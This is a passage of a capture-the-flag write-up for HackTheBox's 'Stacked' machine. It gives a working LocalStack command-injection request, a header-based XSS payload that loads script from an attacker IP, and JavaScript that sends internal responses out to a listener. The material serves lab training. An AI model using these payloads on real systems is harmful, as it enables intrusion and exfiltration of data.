class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br></pre></td><td class="code"><pre><span class="line">bash-5.0<span class="comment"># cat /opt/code/localstack/localstack/dashboard/api.py</span></span><br><span class="line">import os</span><br><span class="line">import json</span><br><span class="line">from flask import Flask, render_template, jsonify, send_from_directory, request</span><br><span class="line">from flask_swagger import swagger</span><br><span class="line">from localstack import config</span><br><span class="line">from localstack.utils import common</span><br><span class="line">from localstack.services import generic_proxy, plugins</span><br><span class="line">from localstack.services import infra as services_infra</span><br><span class="line">from localstack.constants import VERSION, LOCALSTACK_WEB_PROCESS</span><br><span class="line">from localstack.dashboard import infra</span><br><span class="line">from localstack.utils.bootstrap import load_plugins, canonicalize_api_names</span><br><span class="line">from localstack.utils.aws.aws_stack import Environment</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">root_path = os.path.dirname(os.path.realpath(__file__))</span><br><span class="line">web_dir = root_path + <span class="string">&#x27;/web/&#x27;</span></span><br><span class="line"></span><br><span class="line">app = Flask(<span class="string">&#x27;app&#x27;</span>, template_folder=web_dir)</span><br><span class="line">app.root_path = root_path</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">@app.route(<span class="string">&#x27;/swagger.json&#x27;</span>)</span><br><span class="line">def spec():</span><br><span class="line">    swag = swagger(app)</span><br><span class="line">    swag[<span class="string">&#x27;info&#x27;</span>][<span class="string">&#x27;version&#x27;</span>] = VERSION</span><br><span class="line">    swag[<span class="string">&#x27;info&#x27;</span>][<span class="string">&#x27;title&#x27;</span>] = <span class="string">&#x27;AWS Resources Dashboard&#x27;</span></span><br><span class="line">    <span class="built_in">return</span> jsonify(swag)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">@app.route(<span class="string">&#x27;/graph&#x27;</span>, methods=[<span class="string">&#x27;POST&#x27;</span>])</span><br><span class="line">def get_graph():</span><br><span class="line">    <span class="comment"># TODO remove?</span></span><br><span class="line">    <span class="string">&quot;&quot;</span><span class="string">&quot; Get deployment graph</span></span><br><span class="line"><span class="string">        ---</span></span><br><span class="line"><span class="string">        operationId: &#x27;getGraph&#x27;</span></span><br><span class="line"><span class="string">        parameters:</span></span><br><span class="line"><span class="string">            - name: request</span></span><br><span class="line"><span class="string">              in: body</span></span><br><span class="line"><span class="string">    &quot;</span><span class="string">&quot;&quot;</span></span><br><span class="line">    data = get_payload()</span><br><span class="line">    <span class="built_in">env</span> = Environment.from_string(data.get(<span class="string">&#x27;awsEnvironment&#x27;</span>))</span><br><span class="line">    graph = infra.get_graph(name_filter=data[<span class="string">&#x27;nameFilter&#x27;</span>], <span class="built_in">env</span>=<span class="built_in">env</span>, region=data.get(<span class="string">&#x27;awsRegion&#x27;</span>))</span><br><span class="line">    <span class="built_in">return</span> jsonify(graph)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">@app.route(<span class="string">&#x27;/services&#x27;</span>, methods=[<span class="string">&#x27;GET&#x27;</span>])</span><br><span class="line">def get_status():</span><br><span class="line">    <span class="string">&quot;&quot;</span><span class="string">&quot; Get status of deployed services</span></span><br><span class="line"><span class="string">        ---</span></span><br><span class="line"><span class="string">        operationId: &#x27;getStatus&#x27;</span></span><br><span class="line"><span class="string">    &quot;</span><span class="string">&quot;&quot;</span></span><br><span class="line">    result = services_infra.get_services_status()</span><br><span class="line">    <span class="built_in">return</span> jsonify(result)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">@app.route(<span class="string">&#x27;/services&#x27;</span>, methods=[<span class="string">&#x27;POST&#x27;</span>])</span><br><span class="line">def set_status():</span><br><span class="line">    <span class="string">&quot;&quot;</span><span class="string">&quot; Set status of deployed services</span></span><br><span class="line"><span class="string">        ---</span></span><br><span class="line"><span class="string">        operationId: &#x27;setStatus&#x27;</span></span><br><span class="line"><span class="string">    &quot;</span><span class="string">&quot;&quot;</span></span><br><span class="line">    data = get_payload()</span><br><span class="line">    result = services_infra.set_service_status(data)</span><br><span class="line">    <span class="built_in">return</span> jsonify(result)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">@app.route(<span class="string">&#x27;/kinesis/&lt;streamName&gt;/&lt;shardId&gt;/events/latest&#x27;</span>, methods=[<span class="string">&#x27;POST&#x27;</span>])</span><br><span class="line">def get_kinesis_events(streamName, shardId):</span><br><span class="line">    <span class="string">&quot;&quot;</span><span class="string">&quot; Get latest events from Kinesis.</span></span><br><span class="line"><span class="string">        ---</span></span><br><span class="line"><span class="string">        operationId: &#x27;getKinesisEvents&#x27;</span></span><br><span class="line"><span class="string">        parameters:</span></span><br><span class="line"><span class="string">            - name: streamName</span></span><br><span class="line"><span class="string">              in: path</span></span><br><span class="line"><span class="string">            - name: shardId</span></span><br><span class="line"><span class="string">              in: path</span></span><br><span class="line"><span class="string">            - name: request</span></span><br><span class="line"><span class="string">              in: body</span></span><br><span class="line"><span class="string">    &quot;</span><span class="string">&quot;&quot;</span></span><br><span class="line">    data = get_payload()</span><br><span class="line">    <span class="built_in">env</span> = Environment.from_string(data.get(<span class="string">&#x27;awsEnvironment&#x27;</span>))</span><br><span class="line">    result = infra.get_kinesis_events(stream_name=streamName, shard_id=shardId, <span class="built_in">env</span>=<span class="built_in">env</span>)</span><br><span class="line">    <span class="built_in">return</span> jsonify(result)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">@app.route(<span class="string">&#x27;/lambda/&lt;functionName&gt;/code&#x27;</span>, methods=[<span class="string">&#x27;POST&#x27;</span>])</span><br><span class="line">def get_lambda_code(functionName):</span><br><span class="line">    <span class="string">&quot;&quot;</span><span class="string">&quot; Get source code for Lambda function.</span></span><br><span class="line"><span class="string">        ---</span></span><br><span class="line"><span class="string">        operationId: &#x27;getLambdaCode&#x27;</span></span><br><span class="line"><span class="string">        parameters:</span></span><br><span class="line"><span class="string">            - name: functionName</span></span><br><span class="line"><span class="string">              in: path</span></span><br><span class="line"><span class="string">            - name: request</span></span><br><span class="line"><span class="string">              in: body</span></span><br><span class="line"><span class="string">    &quot;</span><span class="string">&quot;&quot;</span></span><br><span class="line">    data = get_payload()</span><br><span class="line">    <span class="built_in">env</span> = Environment.from_string(data.get(<span class="string">&#x27;awsEnvironment&#x27;</span>))</span><br><span class="line">    result = infra.get_lambda_code(func_name=functionName, <span class="built_in">env</span>=<span class="built_in">env</span>)</span><br><span class="line">    <span class="built_in">return</span> jsonify(result)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">@app.route(<span class="string">&#x27;/health&#x27;</span>)</span><br><span class="line">def get_health():</span><br><span class="line">    <span class="comment"># <span class="doctag">TODO:</span> this should be moved into a separate service, once the dashboard UI is removed</span></span><br><span class="line">    reload = request.args.get(<span class="string">&#x27;reload&#x27;</span>) is not None</span><br><span class="line">    result = plugins.get_services_health(reload=reload)</span><br><span class="line">    <span class="built_in">return</span> jsonify(result)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">@app.route(<span class="string">&#x27;/&#x27;</span>)</span><br><span class="line">def hello():</span><br><span class="line">    <span class="built_in">return</span> render_template(<span class="string">&#x27;index.html&#x27;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">@app.route(<span class="string">&#x27;/&lt;path:path&gt;&#x27;</span>)</span><br><span class="line">def send_static(path):</span><br><span class="line">    <span class="built_in">return</span> send_from_directory(web_dir + <span class="string">&#x27;/&#x27;</span>, path)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def get_payload():</span><br><span class="line">    <span class="built_in">return</span> json.loads(common.to_str(request.data))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def ensure_webapp_installed():</span><br><span class="line">    web_dir = os.path.realpath(os.path.join(os.path.dirname(__file__), <span class="string">&#x27;web&#x27;</span>))</span><br><span class="line">    node_modules_dir = os.path.join(web_dir, <span class="string">&#x27;node_modules&#x27;</span>, <span class="string">&#x27;jquery&#x27;</span>)</span><br><span class="line">    <span class="keyword">if</span> not os.path.exists(node_modules_dir):</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&#x27;Initializing installation of Web application (this could take a long time, please be patient)&#x27;</span>)</span><br><span class="line">        common.run(<span class="string">&#x27;cd &quot;%s&quot;; npm install&#x27;</span> % web_dir)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def serve(port):</span><br><span class="line">    os.environ[LOCALSTACK_WEB_PROCESS] = <span class="string">&#x27;1&#x27;</span></span><br><span class="line">    ensure_webapp_installed()</span><br><span class="line">    load_plugins()</span><br><span class="line">    canonicalize_api_names()</span><br><span class="line"></span><br><span class="line">    backend_url = <span class="string">&#x27;http://localhost:%s&#x27;</span> % port</span><br><span class="line">    services_infra.start_proxy(config.PORT_WEB_UI_SSL, backend_url, use_ssl=True)</span><br><span class="line"></span><br><span class="line">    generic_proxy.serve_flask_app(app=app, port=port, quiet=True)</span><br></pre></td></tr></table></figure>

<p>On the OS Command Injection section of the blog, If I make a POST request to &#x2F;lambda&#x2F;<functionName>&#x2F;code the parameter functionName is passed to get_lambda_code</p>
<p>The get_lambda_code function want awsEnvironment parameter<br>So we can input the functionName with command injection with awsEnvironment parameter to our localstack machine to test it.<br>I try this script to create a test file in the localstack machine.</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">‚îå‚îÄ‚îÄ(rootüíÄkali)-[~/hackthebox/machine/stacked]</span><br><span class="line">‚îî‚îÄ<span class="comment"># curl -X POST &quot;http://localhost:8080/lambda/func;touch%20test/code&quot; -H &quot;Content-Type: application/json&quot; -d  &#x27;&#123;&quot;awsEnvironment&quot;: &quot;nothing&quot;&#125;&#x27;</span></span><br><span class="line">&lt;!DOCTYPE HTML PUBLIC <span class="string">&quot;-//W3C//DTD HTML 3.2 Final//EN&quot;</span>&gt;</span><br><span class="line">&lt;title&gt;500 Internal Server Error&lt;/title&gt;</span><br><span class="line">&lt;h1&gt;Internal Server Error&lt;/h1&gt;</span><br><span class="line">&lt;p&gt;The server encountered an internal error and was unable to complete your request. Either the server is overloaded or there is an error <span class="keyword">in</span> the application.&lt;/p&gt;</span><br></pre></td></tr></table></figure>

<p>We need to send the POST request to port 8080 because that is the dashboard.</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">‚îå‚îÄ‚îÄ(rootüíÄkali)-[~/hackthebox/machine/stacked]</span><br><span class="line">‚îî‚îÄ<span class="comment"># docker exec -ti 587e29281490 /bin/bash</span></span><br><span class="line">bash-5.0<span class="comment"># ls -la test</span></span><br><span class="line">-rw-r--r--    1 localsta localsta         0 Feb 14 03:34 <span class="built_in">test</span></span><br></pre></td></tr></table></figure>

<p>And the command injection work.<br>Now the problem is how to run it on the victim machine,<br>Looking back n portfolio.stacked.htb page has a contact form, I try simple xss on the form and send it.</p>
<p>but It got detected. my initial thought is I need to bypass the detection. I intercept the request using burp suite and send it to repeater.</p>
<p>I try all XSS bypass payload in the message field but no luck, But when I try the payload on every headers, the js script is execute from Referer header and not returning XSS detected.</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">POST /process.php HTTP/1.1</span><br><span class="line">Host: portfolio.stacked.htb</span><br><span class="line">User-Agent: &lt;script src=<span class="string">&quot;http://10.10.14.4/&quot;</span>&gt;&lt;/script&gt;</span><br><span class="line">Accept: application/json, text/javascript, */*; q=0.01</span><br><span class="line">Accept-Language: en-US,en;q=0.5</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Content-Type: application/x-www-form-urlencoded; charset=UTF-8</span><br><span class="line">X-Requested-With: XMLHttpRequest</span><br><span class="line">Content-Length: 76</span><br><span class="line">Origin: &lt;script src=<span class="string">&quot;http://10.10.14.4/&quot;</span>&gt;&lt;/script&gt;</span><br><span class="line">Referer: &lt;script src=<span class="string">&quot;http://10.10.14.4/justatest&quot;</span>&gt;&lt;/script&gt;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">fullname=<span class="built_in">test</span>&amp;email=<span class="built_in">test</span>%40qq.com&amp;tel=138232254773&amp;subject=<span class="built_in">test</span>&amp;message=<span class="built_in">test</span></span><br></pre></td></tr></table></figure>

<p>After 2 minutes my listener got a hit from the box.</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">‚îå‚îÄ‚îÄ(rootüíÄkali)-[~/hackthebox/machine/stacked]</span><br><span class="line">‚îî‚îÄ<span class="comment"># python2 -m SimpleHTTPServer 80</span></span><br><span class="line">Serving HTTP on 0.0.0.0 port 80 ...</span><br><span class="line">10.10.11.112 - - [14/Feb/2022 01:44:05] code 404, message File not found</span><br><span class="line">10.10.11.112 - - [14/Feb/2022 01:44:05] <span class="string">&quot;GET /justatest HTTP/1.1&quot;</span> 404 -</span><br></pre></td></tr></table></figure>

<p>Now from this XSS I need to get RCE, but how can I confirm that localstack exist on the remote target?</p>
<p>From the headers I can see that it‚Äôs using XMLHttpRequest to the request.</p>
<p>I can craft a XMLHttpRequest that doing a GET&#x2F;POST request. save to to localstack_confirmation.js</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">// Doing GET request to localstack dashboard on port 8080 to see <span class="keyword">if</span> it<span class="string">&#x27;s exist</span></span><br><span class="line"><span class="string">var xhr = new XMLHttpRequest();</span></span><br><span class="line"><span class="string">var target = &#x27;</span>http://localhost:8080/<span class="string">&#x27;</span></span><br><span class="line"><span class="string">xhr.open(&#x27;</span>GET<span class="string">&#x27;, target, false);</span></span><br><span class="line"><span class="string">xhr.send();</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">// Sending the response back to my python listener.</span></span><br><span class="line"><span class="string">var response = xhr.responseText;</span></span><br><span class="line"><span class="string">var xhr2 = new XMLHttpRequest();</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">// Listener IP</span></span><br><span class="line"><span class="string">xhr2.open(&#x27;</span>GET<span class="string">&#x27;, &#x27;</span>http://10.10.14.4/<span class="string">&#x27; + btoa(response), true);</span></span><br><span class="line"><span class="string">xhr2.send();</span></span><br></pre></td></tr></table></figure>

<p>Start a python server on port 80.</p>
<p>I copied the successful XSS request from the burp suite to curl command to make it easier remove unnecessary header like User-Agent.</p>
<p>Run the curl POST request command and after 2 minutes, the python server show two GET request from target machine, the first GET request is the stacked machine getting the localstack_confirmation.js from python listener, and the second is executing the localstack_confirmation.js code that I make above and send the response back to python listener as base64.</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">10.10.11.112 - - [13/Feb/2022 22:58:04] <span class="string">&quot;GET /localstack_confirmation.js HTTP/1.1&quot;</span> 200 -</span><br><span class="line">10.10.11.112 - - [13/Feb/2022 22:58:43] code 404, message File not found</span><br><span class="line">10.10.11.112 - - [13/Feb/2022 22:58:43] <span class="string">&quot;GET /PCFET0NUWVBFIGh0bWwgUFVCTElDICItLy9XM0MvL0RURCBYSFRNTCAxLjAgVHJhbnNpdGlvbmFsLy9FTiIKImh0dHA6Ly93d3cudzMub3JnL1RSL3hodG1sMS9EVEQveGh0bWwxLXRyYW5zaXRpb25hbC5kdGQiPgo8aHRtbCBsYW5nPSJlbiIgbmctYXBwPSJhcHAiIGNsYXNzPSJuby1qcyBmdWxsc2l6ZSIgY29udGVudD0idGV4dC9odG1sOyBjaGFyc2V0PVVURjgiPgo8aGVhZD4KICA8dGl0bGU+RGFzaGJvYXJkPC90aXRsZT4KICA8bWV0YSBuYW1lPSJ2aWV3cG9ydCIgY29udGVudD0id2lkdGg9ZGV2aWNlLXdpZHRoLCBpbml0aWFsLXNjYWxlPTEiPgogIDxsaW5rIHJlbD0iaWNvbiIgdHlwZT0iaW1hZ2UvcG5nIiBocmVmPSIvaW1nL2xvY2Fsc3RhY2tfaWNvbi5wbmciIC8+CiAgPGxpbmsgcmVsPSJzdHlsZXNoZWV0IiBocmVmPSJub2RlX21vZHVsZXMvYm9vdHN0cmFwL2Rpc3QvY3NzL2Jvb3RzdHJhcC5jc3MiIG1lZGlhPSJhbGwiPgogIDxsaW5rIHJlbD0ic3R5bGVzaGVldCIgaHJlZj0ibm9kZV9tb2R1bGVzL2FuZ3VsYXItdGFibGVzb3J0L3RhYmxlc29ydC5jc3MiIG1lZGlhPSJhbGwiPgogIDxsaW5rIHJlbD0ic3R5bGVzaGVldCIgaHJlZj0ibm9kZV9tb2R1bGVzL2pzcGx1bWIvY3NzL2pzUGx1bWJUb29sa2l0LWRlZmF1bHRzLmNzcyIgbWVkaWE9ImFsbCI+CiAgPGxpbmsgcmVsPSJzdHlsZXNoZWV0IiBocmVmPSJub2RlX21vZHVsZXMvYW5ndWxhci1yZXNpemFibGUvYW5ndWxhci1yZXNpemFibGUubWluLmNzcyIgbWVkaWE9ImFsbCI+CiAgPGxpbmsgcmVsPSJzdHlsZXNoZWV0IiBocmVmPSJub2RlX21vZHVsZXMvYW5ndWxhci11aS1sYXlvdXQvc3JjL3VpLWxheW91dC5jc3MiIG1lZGlhPSJhbGwiPgogIDxsaW5rIHJlbD0ic3R5bGVzaGVldCIgaHJlZj0iY3NzL3N0eWxlLmNzcyIgbWVkaWE9ImFsbCI+CjwvaGVhZD4KPGJvZHkgY2xhc3M9ImZ1bGxzaXplIj4KCjxkaXYgaWQ9InBhZ2UiIGNsYXNzPSJmdWxsc2l6ZSI+CiAgPCEtLSBIZWFkZXIgLS0+CiAgPGhlYWRlciBpZD0iaGVhZGVyIiByb2xlPSJiYW5uZXIiIHN0eWxlPSJwb3NpdGlvbjogYWJzb2x1dGU7CiAgICAgIHRvcDogMHB4OyB3aWR0aDogMTAwJTsgYm9yZGVyLWJvdHRvbTogMXB4IHNvbGlkICNhYWFhYWE7IGJhY2tncm91bmQ6ICNmYWZhZjQiPgogICAgPG5hdiBjbGFzcz0iYXVpLWhlYWRlciBhdWktZHJvcGRvd24yLXRyaWdnZXItZ3JvdXAiIHJvbGU9Im5hdmlnYXRpb24iPgogICAgICA8ZGl2IGNsYXNzPSJhdWktaGVhZGVyLWlubmVyIj4KICAgICAgICA8ZGl2IGNsYXNzPSJhdWktaGVhZGVyLXByaW1hcnkiPgogICAgICAgICAgPGgxIGlkPSJsb2dvIiBjbGFzcz0iYXVpLWhlYWRlci1sb2dvIGF1aS1oZWFkZXItbG9nby10ZXh0b25seSI+CiAgICAgICAgICAJCTxzcGFuIGNsYXNzPSJhdWktaGVhZGVyLWxvZ28tZGV2aWNlIj4KICAgICAgICAgICAgICAgIDxpbWcgc3JjPSJpbWcvbG9jYWxzdGFja19zbWFsbC5wbmciIHN0eWxlPSJoZWlnaHQ6IDMwcHg7IHBhZGRpbmc6IDJweDsgbWFyZ2luLXJpZ2h0OiAxMHB4OyIvPgogICAgICAgICAgICAgIDwvc3Bhbj4KICAgICAgICAgIDwvaDE+CiAgICAgICAgPC9kaXY+CiAgICAgIDwvZGl2PgogICAgPC9uYXY+CiAgPC9oZWFkZXI+CgogIDwhLS0gQ29udGVudCAtLT4KICA8c2VjdGlvbiBpZD0iY29udGVudCIgcm9sZT0ibWFpbiIgdWktdmlldyBjbGFzcz0iZnVsbHNpemUiIHN0eWxlPSJwb3NpdGlvbjogYWJzb2x1dGU7IHRvcDogMHB4OyBwYWRkaW5nLXRvcDogNDBweDsgei1pbmRleDogMSI+IDwvc2VjdGlvbj4KCjwvZGl2PgoKPHNjcmlwdCBzcmM9Im5vZGVfbW9kdWxlcy9qcXVlcnkvZGlzdC9qcXVlcnkubWluLmpzIj48L3NjcmlwdD4KPHNjcmlwdCBzcmM9Im5vZGVfbW9kdWxlcy9kYWdyZS9kaXN0L2RhZ3JlLmpzIj48L3NjcmlwdD4KPHNjcmlwdCBzcmM9Im5vZGVfbW9kdWxlcy9qc3BsdW1iL2Rpc3QvanMvanNQbHVtYi0yLjEuNC5qcyI+PC9zY3JpcHQ+CjxzY3JpcHQgc3JjPSJub2RlX21vZHVsZXMvc3dhZ2dlci1jbGllbnQvYnJvd3Nlci9zd2FnZ2VyLWNsaWVudC5qcyI+PC9zY3JpcHQ+CjxzY3JpcHQgc3JjPSJub2RlX21vZHVsZXMvYW5ndWxhci9hbmd1bGFyLmpzIj48L3NjcmlwdD4KPHNjcmlwdCBzcmM9Im5vZGVfbW9kdWxlcy9hbmd1bGFyLXVpLXJvdXRlci9yZWxlYXNlL2FuZ3VsYXItdWktcm91dGVyLmpzIj48L3NjcmlwdD4KPHNjcmlwdCBzcmM9Im5vZGVfbW9kdWxlcy9hbmd1bGFyLXJlc291cmNlL2FuZ3VsYXItcmVzb3VyY2UuanMiPjwvc2NyaXB0Pgo8c2NyaXB0IHNyYz0ibm9kZV9tb2R1bGVzL2FuZ3VsYXItc2FuaXRpemUvYW5ndWxhci1zYW5pdGl6ZS5qcyI+PC9zY3JpcHQ+CjxzY3JpcHQgc3JjPSJub2RlX21vZHVsZXMvYW5ndWxhci10YWJsZXNvcnQvanMvYW5ndWxhci10YWJsZXNvcnQuanMiPjwvc2NyaXB0Pgo8c2NyaXB0IHNyYz0ibm9kZV9tb2R1bGVzL2FuZ3VsYXItcmVzaXphYmxlL2FuZ3VsYXItcmVzaXphYmxlLm1pbi5qcyI+PC9zY3JpcHQ+CjxzY3JpcHQgc3JjPSJub2RlX21vZHVsZXMvYW5ndWxhci11aS1sYXlvdXQvc3JjL3VpLWxheW91dC5qcyI+PC9zY3JpcHQ+Cgo8c2NyaXB0PgokLnVybFBhcmFtID0gZnVuY3Rpb24obmFtZSl7CiAgdmFyIHJlc3VsdHMgPSBuZXcgUmVnRXhwKCdbXD8mXScgKyBuYW1lICsgJz0oW14mI10qKScpLmV4ZWMod2luZG93LmxvY2F0aW9uLmhyZWYpOwogIGlmIChyZXN1bHRzPT1udWxsKXsKICAgICByZXR1cm4gbnVsbDsKICB9CiAgZWxzZXsKICAgICByZXR1cm4gcmVzdWx0c1sxXSB8fCAwOwogIH0KfQo8L3NjcmlwdD4KCjwhLS0gPHNjcmlwdCBzcmM9ImpzL2pvaW50LmRlZnMuanMiPjwvc2NyaXB0PiAtLT4KPHNjcmlwdCBzcmM9ImpzL2FwcC5qcyI+PC9zY3JpcHQ+CjxzY3JpcHQgc3JjPSJqcy9zZXJ2aWNlcy5qcyI+PC9zY3JpcHQ+CjxzY3JpcHQgc3JjPSJ2aWV3cy9pbmZyYS5qcyI+PC9zY3JpcHQ+CjxzY3JpcHQgc3JjPSJ2aWV3cy9pbmZyYS5ncmFwaC5qcyI+PC9zY3JpcHQ+CjxzY3JpcHQgc3JjPSJ2aWV3cy9pbmZyYS5kZXRhaWxzLmpzIj48L3NjcmlwdD4KPHNjcmlwdCBzcmM9InZpZXdzL2NvbmZpZy5qcyI+PC9zY3JpcHQ+Cgo8L2JvZHk+CjwvaHRtbD4= HTTP/1.1&quot;</span> 404 -</span><br></pre></td></tr></table></figure>

<p>I decode the base64, and it‚Äôs the index.html page from localstack. you can check it by running the localstack image again and visit <span class="exturl" data-url="aHR0cDovL2xvY2FsaG9zdDo4MDgwLw==">http://localhost:8080<i class="fa fa-external-link-alt"></i></span> on your machine.</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br></pre></td><td class="code"><pre><span class="line">&lt;!DOCTYPE html PUBLIC <span class="string">&quot;-//W3C//DTD XHTML 1.0 Transitional//EN&quot;</span></span><br><span class="line"><span class="string">&quot;http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd&quot;</span>&gt;</span><br><span class="line">&lt;html lang=<span class="string">&quot;en&quot;</span> ng-app=<span class="string">&quot;app&quot;</span> class=<span class="string">&quot;no-js fullsize&quot;</span> content=<span class="string">&quot;text/html; charset=UTF8&quot;</span>&gt;</span><br><span class="line">&lt;<span class="built_in">head</span>&gt;</span><br><span class="line">  &lt;title&gt;Dashboard&lt;/title&gt;</span><br><span class="line">  &lt;meta name=<span class="string">&quot;viewport&quot;</span> content=<span class="string">&quot;width=device-width, initial-scale=1&quot;</span>&gt;</span><br><span class="line">  &lt;<span class="built_in">link</span> rel=<span class="string">&quot;icon&quot;</span> <span class="built_in">type</span>=<span class="string">&quot;image/png&quot;</span> href=<span class="string">&quot;/img/localstack_icon.png&quot;</span> /&gt;</span><br><span class="line">  &lt;<span class="built_in">link</span> rel=<span class="string">&quot;stylesheet&quot;</span> href=<span class="string">&quot;node_modules/bootstrap/dist/css/bootstrap.css&quot;</span> media=<span class="string">&quot;all&quot;</span>&gt;</span><br><span class="line">  &lt;<span class="built_in">link</span> rel=<span class="string">&quot;stylesheet&quot;</span> href=<span class="string">&quot;node_modules/angular-tablesort/tablesort.css&quot;</span> media=<span class="string">&quot;all&quot;</span>&gt;</span><br><span class="line">  &lt;<span class="built_in">link</span> rel=<span class="string">&quot;stylesheet&quot;</span> href=<span class="string">&quot;node_modules/jsplumb/css/jsPlumbToolkit-defaults.css&quot;</span> media=<span class="string">&quot;all&quot;</span>&gt;</span><br><span class="line">  &lt;<span class="built_in">link</span> rel=<span class="string">&quot;stylesheet&quot;</span> href=<span class="string">&quot;node_modules/angular-resizable/angular-resizable.min.css&quot;</span> media=<span class="string">&quot;all&quot;</span>&gt;</span><br><span class="line">  &lt;<span class="built_in">link</span> rel=<span class="string">&quot;stylesheet&quot;</span> href=<span class="string">&quot;node_modules/angular-ui-layout/src/ui-layout.css&quot;</span> media=<span class="string">&quot;all&quot;</span>&gt;</span><br><span class="line">  &lt;<span class="built_in">link</span> rel=<span class="string">&quot;stylesheet&quot;</span> href=<span class="string">&quot;css/style.css&quot;</span> media=<span class="string">&quot;all&quot;</span>&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;body class=<span class="string">&quot;fullsize&quot;</span>&gt;</span><br><span class="line"></span><br><span class="line">&lt;div <span class="built_in">id</span>=<span class="string">&quot;page&quot;</span> class=<span class="string">&quot;fullsize&quot;</span>&gt;</span><br><span class="line">  &lt;!-- Header --&gt;</span><br><span class="line">  &lt;header <span class="built_in">id</span>=<span class="string">&quot;header&quot;</span> role=<span class="string">&quot;banner&quot;</span> style=<span class="string">&quot;position: absolute;</span></span><br><span class="line"><span class="string">      top: 0px; width: 100%; border-bottom: 1px solid #aaaaaa; background: #fafaf4&quot;</span>&gt;</span><br><span class="line">    &lt;nav class=<span class="string">&quot;aui-header aui-dropdown2-trigger-group&quot;</span> role=<span class="string">&quot;navigation&quot;</span>&gt;</span><br><span class="line">      &lt;div class=<span class="string">&quot;aui-header-inner&quot;</span>&gt;</span><br><span class="line">        &lt;div class=<span class="string">&quot;aui-header-primary&quot;</span>&gt;</span><br><span class="line">          &lt;h1 <span class="built_in">id</span>=<span class="string">&quot;logo&quot;</span> class=<span class="string">&quot;aui-header-logo 